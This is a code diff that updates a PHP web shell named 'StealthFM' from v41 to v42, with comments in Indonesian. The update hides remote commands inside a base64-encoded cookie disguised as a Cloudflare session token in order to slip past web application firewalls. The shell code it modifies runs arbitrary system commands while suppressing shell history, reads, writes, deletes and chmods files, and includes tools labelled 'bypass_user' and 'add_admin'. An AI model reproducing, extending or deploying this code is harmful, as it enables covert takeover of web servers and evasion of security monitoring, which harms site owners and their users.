@@ -1,6 +1,6 @@
 <?php
 // -------------------------------------------------------------------------
-// STEALTH FM V41 (MADE WITH LOVE + GHOST PROTOCOL)
+// STEALTH FM V42 (COOKIE TRANSPORT EDITION - ANTI WAF)
 // -------------------------------------------------------------------------
 
 // 1. STEALTH MODE: DISABLE PHP LOGS
@@ -29,12 +29,24 @@ cloak_headers();
 
 if (isset($_GET['do_phpinfo'])) { phpinfo(); exit; }
 
-$h_act  = 'HTTP_X_ACTION';
-$h_path = 'HTTP_X_PATH';
-$h_data = 'HTTP_X_DATA'; 
-$h_cmd  = 'HTTP_X_CMD';
-$h_tool = 'HTTP_X_TOOL';
-$h_step = 'HTTP_X_STEP'; 
+// --- MODIFIKASI V42: COOKIE PAYLOAD DECODER ---
+// Menggantikan pengambilan dari HTTP Headers yang sering diblokir.
+$cookie_name = '__cf_sess_verify'; 
+$payload = [];
+
+if (isset($_COOKIE[$cookie_name])) {
+    $json = base64_decode($_COOKIE[$cookie_name]);
+    $payload = json_decode($json, true);
+}
+
+// Mapping payload: a=action, p=path, d=data, c=cmd, t=tool, s=step
+$act  = $payload['a'] ?? ''; 
+$enc_path = $payload['p'] ?? '';
+$data = $payload['d'] ?? ''; 
+$cmd_val  = $payload['c'] ?? '';
+$tool_val = $payload['t'] ?? '';
+$step_val = $payload['s'] ?? 0;
+// ----------------------------------------------
 
 $root = realpath(__DIR__); 
 
@@ -90,9 +102,10 @@ function human_filesize($bytes, $dec = 2) {
     return sprintf("%.{$dec}f", $bytes / pow(1024, $factor)) . @$size[$factor];
 }
 
-if (isset($_SERVER[$h_act])) {
-    $action = $_SERVER[$h_act];
-    $raw_path = isset($_SERVER[$h_path]) ? base64_decode($_SERVER[$h_path]) : '';
+// --- LOGIC UTAMA DIMODIFIKASI UNTUK MEMBACA VARIABLE DARI COOKIE ---
+if ($act) {
+    $action = $act;
+    $raw_path = $enc_path ? base64_decode($enc_path) : '';
     
     if ($raw_path === '__HOME__') { $target = getcwd(); } 
     elseif ($raw_path === '') { $target = getcwd(); } 
@@ -131,11 +144,15 @@ if (isset($_SERVER[$h_act])) {
     if ($action === 'read') { if (is_file($target)) echo file_get_contents($target); else echo "Err: Not a file"; exit; }
     if ($action === 'save' || $action === 'upload') { $input = file_get_contents("php://input"); echo (file_put_contents($target, $input) !== false) ? "Success" : "Err: Write failed"; exit; }
     if ($action === 'delete') { echo force_delete($target) ? "Deleted" : "Fail delete"; exit; }
-    if ($action === 'rename') { $n = isset($_SERVER[$h_data]) ? base64_decode($_SERVER[$h_data]) : ''; if ($n) echo rename($target, dirname($target).'/'.$n) ? "Renamed" : "Fail"; exit; }
-    if ($action === 'chmod') { $m = isset($_SERVER[$h_data]) ? $_SERVER[$h_data] : ''; if ($m) echo chmod($target, octdec($m)) ? "Chmod OK" : "Fail"; exit; }
+    
+    // Rename menggunakan 'data' (encoded base64 dari JS)
+    if ($action === 'rename') { $n = $data ? base64_decode($data) : ''; if ($n) echo rename($target, dirname($target).'/'.$n) ? "Renamed" : "Fail"; exit; }
+    
+    // Chmod menggunakan 'data' (raw octal string dari JS)
+    if ($action === 'chmod') { $m = $data ? $data : ''; if ($m) echo chmod($target, octdec($m)) ? "Chmod OK" : "Fail"; exit; }
     
     if ($action === 'cmd') {
-        $cmd = isset($_SERVER[$h_cmd]) ? base64_decode($_SERVER[$h_cmd]) : 'whoami'; 
+        $cmd = $cmd_val ? base64_decode($cmd_val) : 'whoami'; 
         // STEALTH: Prevent History
         $cmd = "export HISTFILE=/dev/null; " . $cmd . " 2>&1"; 
         $out = ""; 
@@ -147,7 +164,7 @@ if (isset($_SERVER[$h_act])) {
     }
 
     if ($action === 'tool') {
-        $tool = isset($_SERVER[$h_tool]) ? $_SERVER[$h_tool] : '';
+        $tool = $tool_val ? $tool_val : '';
         $home_dirs = get_home_dirs();
         
         if ($tool === 'bypass_user') {
@@ -158,7 +175,7 @@ if (isset($_SERVER[$h_act])) {
         }
 
         if ($tool === 'add_admin') {
-            $step = isset($_SERVER[$h_step]) ? (int)$_SERVER[$h_step] : 0;
+            $step = $step_val ? (int)$step_val : 0;
             $limit = 5; 
             $scan_path = is_dir($target . '/jumping') ? $target . '/jumping' : $target;
             $all_files = scandir($scan_path);
@@ -235,7 +252,7 @@ if (isset($_SERVER[$h_act])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <title>StealthFM v41</title>
+    <title>StealthFM v42</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/ace.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
@@ -419,7 +436,7 @@ if (isset($_SERVER[$h_act])) {
     <div class="container-fluid flex-nowrap gap-3">
         <a class="navbar-brand d-flex align-items-center me-0" href="#">
             <i class="fas fa-ghost me-2 text-white"></i>
-            <span class="text-white">Stealth<span class="text-primary">FM</span></span>
+            <span class="text-white">Stealth<span class="text-primary">FM v42</span></span>
         </a>
         <div class="d-flex gap-2">
             <button class="btn btn-modern" onclick="goHome()" title="Home"><i class="fas fa-home"></i></button>
@@ -449,7 +466,7 @@ if (isset($_SERVER[$h_act])) {
 
     <div id="terminal-panel" style="display:none;">
         <div class="term-header"><span class="term-title">ROOT@SHELL:~#</span><i class="fas fa-times panel-close" onclick="toggleTerm()"></i></div>
-        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v41</div></div>
+        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v42</div></div>
         <div class="term-input-row"><span class="term-prompt">➜</span><input type="text" id="term-cmd-inline" placeholder="Type command..." autocomplete="off"></div>
     </div>
     <div id="process-panel" style="display:none;">
@@ -536,10 +553,38 @@ if (isset($_SERVER[$h_act])) {
         setTimeout(() => { div.classList.add('hiding'); setTimeout(() => div.remove(), 300); }, 3000);
     }
 
-    async function api(action, path, method='GET', extraHeaders={}, body=null, signal=null) {
-        let headers = { 'X-Action': action, 'X-Path': btoa(path), ...extraHeaders };
-        return fetch(window.location.href, { method, headers, body, signal });
+    // --- MODIFIKASI V42: COOKIE TRANSPORT JS ---
+    async function api(action, path, method='GET', extraData={}, body=null, signal=null) {
+        // 1. Siapkan payload data
+        let payload = {
+            a: action,          // a = action
+            p: btoa(path)       // p = path (base64)
+        };
+
+        // 2. Masukkan data tambahan ke payload (mapping ke key pendek)
+        if(extraData['X-Data']) payload.d = extraData['X-Data'];
+        if(extraData['X-Cmd'])  payload.c = extraData['X-Cmd'];
+        if(extraData['X-Tool']) payload.t = extraData['X-Tool'];
+        if(extraData['X-Step']) payload.s = extraData['X-Step'];
+
+        // 3. Encode payload ke JSON -> Base64
+        let jsonStr = JSON.stringify(payload);
+        let cookieVal = btoa(jsonStr);
+
+        // 4. SET COOKIE (Trik Bypass WAF)
+        // Simpan perintah di cookie '__cf_sess_verify' agar terlihat seperti token sesi
+        document.cookie = "__cf_sess_verify=" + cookieVal + "; path=/; SameSite=Strict";
+
+        // 5. Kirim Request
+        // URL tetap bersih (window.location.href), tidak ada param tambahan.
+        // Body hanya terisi jika upload file.
+        return fetch(window.location.href, { 
+            method: method, 
+            body: body, 
+            signal: signal 
+        });
     }
+    // -------------------------------------------
     
     function goHome() { currentPath = '__HOME__'; loadDir('__HOME__'); }
 
